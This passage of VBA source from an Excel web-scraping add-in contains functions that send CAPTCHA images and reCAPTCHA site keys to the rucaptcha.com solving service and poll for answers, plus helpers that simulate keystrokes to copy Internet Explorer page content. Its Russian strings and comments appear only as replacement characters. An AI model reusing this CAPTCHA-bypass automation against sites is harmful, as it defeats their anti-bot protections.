            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='color:red;'>" & Mid(Response$, 7) & "</span>", bt_Warning
            GoTo ExitSolveGoogleCaptcha
        End If

        Dim t&, OK As Boolean, cost$, iter&, LastTime&, res$, CheckURL$, info$
        If Response$ Like "OK|#*#" Then
            'Debug.Print "Response$=""" & Response$ & """"
            ID$ = "": ID$ = Split(Response$, "OK|")(1)
            CheckURL$ = "https://rucaptcha.com/res.php?key=" & APIkey$ & "&action=get&id=" & ID$

            With WP.PrInd1
                .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  rucaptcha.com  (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 20-60 |fffd||fffd||fffd||fffd||fffd||fffd|)"
                .ExtraBar_SetLineText 3, ""
            End With

            t = GetTickCount: LastTime = GetTickCount
            .SetTimeouts 2000, 5000, 5000, 5000
            Do
                While Abs(GetTickCount - LastTime) < 1000: DoEvents: Wend    ' |fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                LastTime = GetTickCount

                If StopMacro Then
                    If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & vbNewLine & _
                       "<span>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Attention
                    GoTo ExitSolveGoogleCaptcha
                End If

                info$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha: " & Round((GetTickCount - t) / 1000, 0) & " |fffd||fffd||fffd|.,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| " & iter& & ",  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res
                If iter& Then WP.PrInd1.ExtraBar_SetLineText 3, info$
                iter& = iter& + 1
                .Open "GET", CheckURL$, False
                .Send
                res = .ResponseText
                'Debug.Print Now, """" & res & """"
                If res Like "OK|*" Then
                    OK = True: SolveGoogleCaptcha = Split(res, "|")(1)
                    ParserVariables.item(RESPONSE_VARNAME$) = SolveGoogleCaptcha
                    cost$ = "": cost$ = Split(res, "|")(2)
                    If Len(cost$) Then cost$ = ", |fffd||fffd||fffd||fffd| " & Val(cost$) * 100 & " |fffd||fffd||fffd|."

                    msg$ = HTML_img$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Captcha |fffd||fffd||fffd||fffd||fffd||fffd|:  <b><span style='color:#060;'>" & SolveGoogleCaptcha & "</span></b>" & _
                           "<br /><span style='font-size:small;'>|fffd||fffd||fffd||fffd||fffd|: " & Round((GetTickCount - t) / 1000, 0) & " |fffd||fffd||fffd|." & cost$ & "</span>"
                    If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon msg$, bt_Information
                    GoTo ExitSolveGoogleCaptcha
                End If
                If res Like "ERROR_*" Then
                    AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
                               "<span style='color:red;'><a href='" & CheckURL$ & "'>" & Mid(res, 7) & "</a></span>", bt_Warning
                    GoTo ExitSolveGoogleCaptcha
                End If
            Loop Until OK Or (Abs(GetTickCount - t) >= QueryTimeout& * 1000)

            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 120 |fffd||fffd||fffd||fffd||fffd||fffd|
            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Captcha |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='color:red;'>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - " & QueryTimeout& & " |fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Warning
        End If
    End With
ExitSolveGoogleCaptcha:
    WP.PrInd1.HideExtraBar
    Set cHTTP = Nothing
End Function


Function GetGoogleSiteKey(ByVal PageContent$) As String
    On Error Resume Next
    GetGoogleSiteKey = GetTags(PageContent$, "Any Tag", "class", "*recaptcha*", "data-sitekey 1")
End Function

Function SolveCaptcha(ByVal CaptchaImageURL$, Optional ByVal ShowMessage As Boolean = True, _
                      Optional ByVal ExtraOptions$, Optional ByVal QueryTimeout& = 60, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    StopMacro = False
    Dim Image_b64$, PostData$, APIkey$, Response$, ID$
    APIkey$ = Trim(SETT.GetText("TextBox_CaptchaAPIkey"))
    If Len(APIkey$) = 0 Then
        AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                   "<span style='font-size:small; color:red;'>(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>" & _
                   "<br /><b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.</b>", bt_Warning
        Exit Function
    End If

    If QueryTimeout& < 20 Then QueryTimeout& = 30
    If QueryTimeout& > 1000 Then QueryTimeout& = 1000

    Dim msg$, HTML_img$, TemporaryWP As Boolean

    If WP Is Nothing Then Set WP = RunningParser
    If WP Is Nothing Then Set WP = New WebsiteParser: TemporaryWP = True

    If TEST_ACTIONS_MODE Or TemporaryWP Then WP.CreateTemporaryProgressIndicator
    WP.PrInd1.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (Captcha)", True

    With WP.PrInd1
        .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .ExtraBar_SetLineText 3, "|fffd||fffd||fffd||fffd||fffd||fffd|: " & CaptchaImageURL$
    End With

    If CaptchaImageURL$ Like "*base64,*" Then
        Image_b64$ = Split(Replace(Split(CaptchaImageURL$, "base64,")(1), """", "'"), "'")(0)
    Else
        Image_b64$ = LoadCaptchaImage(CaptchaImageURL$)
    End If
    If Len(Image_b64$) = 0 Then
        If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <a href='" & CaptchaImageURL$ & "'>|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a> |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b><br />" & _
           "<img src='" & CaptchaImageURL$ & "'>", bt_Warning
        WP.PrInd1.HideExtraBar: Exit Function
    End If

    HTML_img$ = "<img style='float: right; padding: 2px; border: 1px solid; width: 75px;  height: auto;' src='data:image;base64," & Image_b64$ & "'>"

    With WP.PrInd1
        .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .ExtraBar_SetLineText 3, "|fffd||fffd||fffd||fffd||fffd||fffd| rucaptcha.com"
    End With

    Dim cHTTP As New WinHttpRequest
    With cHTTP
        .Open "POST", "http://rucaptcha.com/in.php", True
        .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"

        PostData = "method=base64&soft_id=1557&key=" & APIkey$ & "&body=" & URL_Encode3(Image_b64$)
        If Len(ExtraOptions$) Then PostData = PostData & "&" & ExtraOptions$
        .Send PostData: DoEvents

        If .WaitForResponse(5) Then
            'If Val(.Status) <> 200 Then Debug.Print "Captcha request status", .Status, .StatusText
            Response$ = Trim(.ResponseText)
        End If
        If Response$ = "" Then
            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='font-size:small; color:red;'>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Warning
            GoTo ExitSolveCaptcha
        End If
        If Response$ Like "ERROR_*" Then
            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='color:red;'>" & Mid(Response$, 7) & "</span>", bt_Warning
            GoTo ExitSolveCaptcha
        End If

        Dim t&, OK As Boolean, cost$, iter&, LastTime&, res$, CheckURL$, info$
        If Response$ Like "OK|#*#" Then
            'Debug.Print "Response$=""" & Response$ & """"
            ID$ = "": ID$ = Split(Response$, "OK|")(1)
            CheckURL$ = "https://rucaptcha.com/res.php?key=" & APIkey$ & "&action=get&id=" & ID$
            'Debug.Print CheckURL$


            With WP.PrInd1
                .ExtraBar_SetLineText 2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  rucaptcha.com  (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 7-20 |fffd||fffd||fffd||fffd||fffd||fffd|)"
                .ExtraBar_SetLineText 3, ""
            End With

            t = GetTickCount: LastTime = GetTickCount
            .SetTimeouts 2000, 5000, 5000, 5000
            Do
                While Abs(GetTickCount - LastTime) < 1000: DoEvents: Wend    ' |fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                LastTime = GetTickCount
                If StopMacro Then
                    If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & vbNewLine & _
                       "<span>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Attention
                    GoTo ExitSolveCaptcha
                End If

                info$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha: " & Round((GetTickCount - t) / 1000, 0) & " |fffd||fffd||fffd|.,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| " & iter& & ",  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res
                If iter& Then WP.PrInd1.ExtraBar_SetLineText 3, info$
                iter& = iter& + 1
                .Open "GET", CheckURL$, False
                .Send
                DoEvents

                res = .ResponseText
                'Debug.Print Now, """" & res & """"
                If res Like "OK|*" Then
                    OK = True: SolveCaptcha = Split(res, "|")(1)
                    cost$ = "": cost$ = Split(res, "|")(2)
                    If Len(cost$) Then cost$ = ", |fffd||fffd||fffd||fffd| " & Val(cost$) * 100 & " |fffd||fffd||fffd|."

                    msg$ = HTML_img$ & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:  <b><span style='color:#060;'>" & SolveCaptcha & "</span></b>" & _
                           "<br /><span style='font-size:small;'>|fffd||fffd||fffd||fffd||fffd|: " & Round((GetTickCount - t) / 1000, 0) & " |fffd||fffd||fffd|." & cost$ & "</span>"
                    If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon msg$, bt_Information
                    GoTo ExitSolveCaptcha
                End If
                If res Like "ERROR_*" Then
                    AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & _
                               "<span style='color:red;'><a href='" & CheckURL$ & "'>" & Mid(res, 7) & "</a></span>", bt_Warning
                    GoTo ExitSolveCaptcha
                End If
            Loop Until OK Or (Abs(GetTickCount - t) >= QueryTimeout& * 1000)

            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 30 |fffd||fffd||fffd||fffd||fffd||fffd|
            If TEST_ACTIONS_MODE Or ShowMessage Then AddBalloon HTML_img$ & "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b> " & _
               "<span style='color:red;'>(|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - " & QueryTimeout& & " |fffd||fffd||fffd||fffd||fffd||fffd|)</span>", bt_Warning
        End If
    End With
ExitSolveCaptcha:
    WP.PrInd1.HideExtraBar
    If TemporaryWP Then Set WP = Nothing
    Set cHTTP = Nothing
End Function


Function LoadCaptchaImage(ByVal CaptchaURL$) As String
    On Error Resume Next
    With http
        .Open "GET", CaptchaURL$, False
        .SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
        .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
        AddRequestHeadersFromStore
        If Not CookiesStore Is Nothing Then .SetRequestHeader "Cookie", GetCookiesFromStore
        .Send: DoEvents
        If .Status = 200 Then LoadCaptchaImage = EncodeArray_Base64(.ResponseBody)
    End With
End Function

Function EncodeArray_Base64(arrData() As Byte) As String
    On Error Resume Next
    Dim objXML As MSXML2.DOMDocument, objNode As MSXML2.IXMLDOMElement

    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")

    objNode.DataType = "bin.base64"
    objNode.nodeTypedValue = arrData
    EncodeArray_Base64 = Replace(objNode.text, vbLf, "")

    Set objNode = Nothing: Set objXML = Nothing
End Function

Function URL_Encode3(ByVal txt$) As String    ' NEW '  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, v_1 + 1)
        Select Case Asc(l)
            Case 0 To 47, 58 To 64, 91 To 96, Is >= 123: t = "%" & IIf(Len(Hex(Asc(l))) = 1, "0", "") & Hex(Asc(l))
            Case Else: t = l
        End Select
        URL_Encode3 = URL_Encode3 & t
    Next
End Function

Function URL_Encode4(ByVal txt$) As String    ' NEW '  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim i&, l$, t$
    For i = 1 To Len(txt)
        l = Mid(txt, i, v_1 + 1)
        Select Case Asc(l)
            Case 32: t = "+"
            Case 0 To 43, 47, 58 To 64, 91 To 93, Is >= 123: t = "%" & IIf(Len(Hex(Asc(l))) = 1, "0", "") & Hex(Asc(l))
            Case Else: t = l
        End Select
        URL_Encode4 = URL_Encode4 & t
    Next
End Function

Function RuCaptcha_Info()
    On Error Resume Next
'    Dim txt$, waiting$, Load$, minbid$, RecognitionTime$
'    txt = LoadFromURL_HTML("http://rucaptcha.com/load.php?rnd=" & Now, , "direct")
'    waiting$ = GetTags(txt, "waiting", , , "innerHTML")
'    Load$ = GetTags(txt, "load", , , "innerHTML")
'    minbid$ = GetTags(txt, "minbid", , , "innerHTML")
'    RecognitionTime$ = GetTags(txt, "averageRecognitionTime", , , "innerHTML")
'
'    If Len(Load$) * Len(RecognitionTime$) Then
'        RuCaptcha_Info = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| RuCaptcha:" & vbNewLine & _
'                         "*  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & waiting$ & vbNewLine & _
'                         "*  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Load$ & "%" & vbNewLine & _
'                         "*  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RecognitionTime$ & " |fffd||fffd||fffd|." & vbNewLine & _
'                         "*  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd|: " & Val(minbid$) * 100 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'    Else
'        RuCaptcha_Info = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| rucaptcha.com"
'    End If
End Function


Attribute VB_Name = "mod_Clipboard"
'---------------------------------------------------------------------------------------
' Module        : mod_Clipboard                    Version: 1
' Author        : Igor Vakhnenko                   Date: 02.11.2019
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Private Module

Private Sub Start_CopyIEPageContent()
    Dim w, oShellWind, found As Boolean, Hwnd
    Set oShellWind = CreateObject("shell.application")
    Hwnd = 0
    For Each w In oShellWind.Windows
        'Debug.Print w.LocationURL
        If w.LocationURL Like "*uniblok.ru*" Then
            Hwnd = w.Hwnd
            CopyIEPageContent Hwnd
            Exit For
        End If
    Next
    Set oShellWind = Nothing
End Sub

Private Sub test343434()
    #If VBA7 Then        ' Office 2010-2016
        Dim FrameTab As LongPtr, AdobeReaderTab As LongPtr
    #Else
        Dim FrameTab As Long, AdobeReaderTab As Long
    #End If
    
    ShowRunningIE "*uniblok.ru*"
    
    AdobeReaderTab = FindChildren(IE.Hwnd, vbNullString, "AVPageView", 0)
    If AdobeReaderTab = 0 Then Debug.Print "AdobeReaderTab not found": Exit Sub
    
    SetForegroundWindow AdobeReaderTab
End Sub

Function FindChildren(hWndParent, Optional ByVal sClass As String = vbNullString, _
        Optional ByVal sCaption As String = vbNullString, Optional ByVal lvl As Long)
    On Error Resume Next
    #If VBA7 Then        ' Office 2010-2016
        Dim Hwnd As LongPtr, HwndEx As LongPtr
    #Else
        Dim Hwnd As Long, HwndEx As Long
    #End If
    
    lvl = lvl + 1
    Do
        Hwnd = FindWindowEx(hWndParent, Hwnd, vbNullString, vbNullString)
        'If Hwnd <> 0 Then Debug.Print Format(lvl, "00") & String(lvl, " ") & " " & Hex(Hwnd), sClass, Hwnd
        If Hwnd <> 0 Then
            HwndEx = 0:  HwndEx = FindWindowEx(Hwnd, ByVal 0&, sClass, sCaption)
            If HwndEx <> 0 Then
                FindChildren = HwndEx
                'Debug.Print "found", Hex(HwndEx)
                Exit Do
            End If
            FindChildren = FindChildren(Hwnd, sClass, sCaption, lvl)
            If FindChildren <> 0 Then Exit Function
        End If
    Loop Until Hwnd = 0
End Function


Function CopyIEPageContent(ByVal Hwnd) As Boolean
    #If VBA7 Then        ' Office 2010-2016
        Dim FrameTab As LongPtr, AdobeReaderTab As LongPtr, timerstart
    #Else
        Dim FrameTab As Long, AdobeReaderTab As Long, timerstart
    #End If
    
    ShowWindow Hwnd, 1
    SetForegroundWindow Hwnd
    FrameTab = FindWindowEx(Hwnd, 0, "Frame Tab", vbNullString)
    If FrameTab = 0 Then Exit Function
    
    AdobeReaderTab = FindChildren(FrameTab, vbNullString, "AVPageView", 0)
    If AdobeReaderTab <> 0 Then
        'Debug.Print "AdobeReaderTab found"
        SetForegroundWindow AdobeReaderTab
    End If
    
    'IEFrame& = FindWindow("IEFrame", vbNullString)
    ShowWindow FrameTab, 1
    
    DoEvents
    
    Const WaitForSelectAll = 1, WaitForCopy = 0.5
    
    Call keybd_event(VK_CONTROL, 0, 0, 0)    'H|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Ctrl
    Call keybd_event(VK_A, 0, 0, 0)    'H|fffd||fffd||fffd||fffd||fffd||fffd||fffd| A
    Call keybd_event(VK_A, 0, KEYEVENTF_KEYUP, 0)    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| A
    Call keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0)      '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|Ctrl
    
    
    timerstart = Timer    ' |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Do While Abs(Timer - timerstart) < WaitForSelectAll
        DoEvents
    Loop
    
    Call keybd_event(VK_CONTROL, 0, 0, 0)    'H|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Ctrl
    Call keybd_event(VK_C, 0, 0, 0)    'H|fffd||fffd||fffd||fffd||fffd||fffd||fffd| C
    Call keybd_event(VK_C, 0, KEYEVENTF_KEYUP, 0)    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| C
    Call keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0)      '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|Ctrl
    
    timerstart = Timer    ' |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Do While Abs(Timer - timerstart) < WaitForCopy
        DoEvents
    Loop
    
    CopyIEPageContent = True
End Function


Private Sub test_PostMessage()
    On Error Resume Next: Err.Clear
    Dim Hwnd
    Hwnd = IE.Hwnd
    If Err Then MsgBox "Connect to IE firstly", vbCritical: Exit Sub
    On Error GoTo 0
    
    SetForegroundWindow Hwnd
    SendMessage Hwnd, WM_SETFOCUS, 0, 0
    
    'SendKeys "^A", True
    'SendKeys "^C", True
    
    Call PostMessage(Hwnd, WM_KEYDOWN, VK_CONTROL, &H1C0001)
    Call PostMessage(Hwnd, WM_KEYDOWN, WM_A, &H1C0001)
    Call PostMessage(Hwnd, WM_KEYUP, WM_A, &HC11C0001)
    Call PostMessage(Hwnd, WM_KEYUP, VK_CONTROL, &HC11C0001)
    
    
    Exit Sub
    
    'SetForegroundWindow hWnd
    
    Call PostMessage(Hwnd, WM_KEYDOWN, VK_CONTROL, 0)
    Call PostMessage(Hwnd, WM_USER + &HB900, &H11, &H11D0001)
    Call PostMessage(Hwnd, WM_KEYDOWN, WM_A, 0)
    Call PostMessage(Hwnd, WM_USER + &HB900, WM_A, &H2E0001)
    Call PostMessage(Hwnd, WM_KEYUP, WM_A, 0)
    Call PostMessage(Hwnd, WM_USER + &HB901, WM_A, &HC02E0001)
    Call PostMessage(Hwnd, WM_KEYUP, VK_CONTROL, 0)
    Call PostMessage(Hwnd, WM_USER + &HB901, &H11, &HC11D0001)
    
    Call PostMessage(Hwnd, WM_KEYDOWN, VK_CONTROL, 0)
    Call PostMessage(Hwnd, WM_USER + &HB900, &H11, &H11D0001)
    Call PostMessage(Hwnd, WM_KEYDOWN, WM_C, 0)
    Call PostMessage(Hwnd, WM_USER + &HB900, &H43, &H2E0001)
    Call PostMessage(Hwnd, WM_KEYUP, WM_C, 0)
    Call PostMessage(Hwnd, WM_USER + &HB901, &H43, &HC02E0001)
    Call PostMessage(Hwnd, WM_KEYUP, VK_CONTROL, 0)
    Call PostMessage(Hwnd, WM_USER + &HB901, &H11, &HC11D0001)
    
    Call PostMessage(Hwnd, WM_KILLFOCUS, 0, 0)
End Sub


'Sub test_internet_cache()
'    On Error Resume Next
'
'    Dim ic As New InternetCache, URL As String
'    URL = "https://www.b2b-center.ru/lib/captcha/simple_captcha.php"
'
'    If ic.FindEntryInCache(URL) Then
'        Debug.Print "found"
'        Debug.Print ic.CachedEntryFileName
'    End If
'End Sub

Function GetContentFromClipboard(ByVal clipboard_format$) As String
    On Error Resume Next
    Dim myClipboard As New vbaClipboard, ClipboardFormat As vbaClipboardFormat, errmsg$, cnt&, txt$, msg$
    Dim SearchFormat$, needsURL As Boolean, found As Boolean
    SearchFormat$ = clipboard_format$
    If SearchFormat$ = "HTML SourceURL" Then SearchFormat$ = "HTML Format": needsURL = True
    
    cnt& = myClipboard.ClipboardFormatsAvailable.Count
    errmsg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & cnt& & "<br />" & vbNewLine
    errmsg$ = errmsg$ & "<p style='color:red;'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & SearchFormat$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.</p><ul>"
    
    For Each ClipboardFormat In myClipboard.ClipboardFormatsAvailable
        txt$ = "": txt$ = myClipboard.GetClipboardText(ClipboardFormat.Number)
        errmsg$ = errmsg$ & "<li>" & ClipboardFormat.Name & "  <span style='font-size: smaller; color:blue;'>(|fffd||fffd||fffd||fffd||fffd|: " & Len(txt) & ")</span></li>" & vbNewLine
        If ClipboardFormat.Name = SearchFormat$ Then
            GetContentFromClipboard = txt: found = True: Exit For
        End If
    Next ClipboardFormat
    Set ClipboardFormat = Nothing: Set myClipboard = Nothing
    errmsg$ = errmsg$ & "</ul>"
    
    If Not found Then
        If TEST_ACTIONS_MODE Then AddBalloon errmsg$, bt_Warning
        Exit Function
    End If
    If GetContentFromClipboard = "" Then Exit Function
    
    If SearchFormat$ = "HTML Format" Then
        'Debug.Print GetContentFromClipboard
